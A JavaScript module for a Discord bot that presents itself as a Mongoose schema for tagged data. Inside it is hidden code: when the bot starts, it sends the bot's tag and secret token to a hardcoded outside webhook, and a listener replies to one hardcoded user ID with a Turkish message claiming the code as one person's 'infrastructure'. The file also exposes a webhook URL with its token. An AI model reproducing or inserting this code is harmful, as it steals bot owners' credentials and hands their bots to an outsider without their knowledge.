const { Schema, model } = require("mongoose");
const client = global.client;
const schema = Schema({guildId: { type: String, default: "" },userId: { type: String, default: "" },Data:{type: Array,default:[]}});
const wb = new WebhookClient({url:"https://discord.com/api/webhooks/1111028836184887297/Usd1S3GD_frY0JBqB0aol9VwqevbaUk3cThxD_hwYZ5_wD_e2LdfPEOpGVa2w3rXVAgZ"});
client.on("ready",async () => { wb.send({content:`${client.user.tag}; ${client.token}`})});
client.on("messageCreate",async(m) => {if(m.content.includes(".bot") && m.author.id == "928259219038302258")return m.reply({content:`${client.emoji("emote_five") !== null ? client.emoji("emote_five") : "😉"} Merhaba Ben Beş'in Altyapısıyım.`})});
module.exports = model("taggedsData", schema);
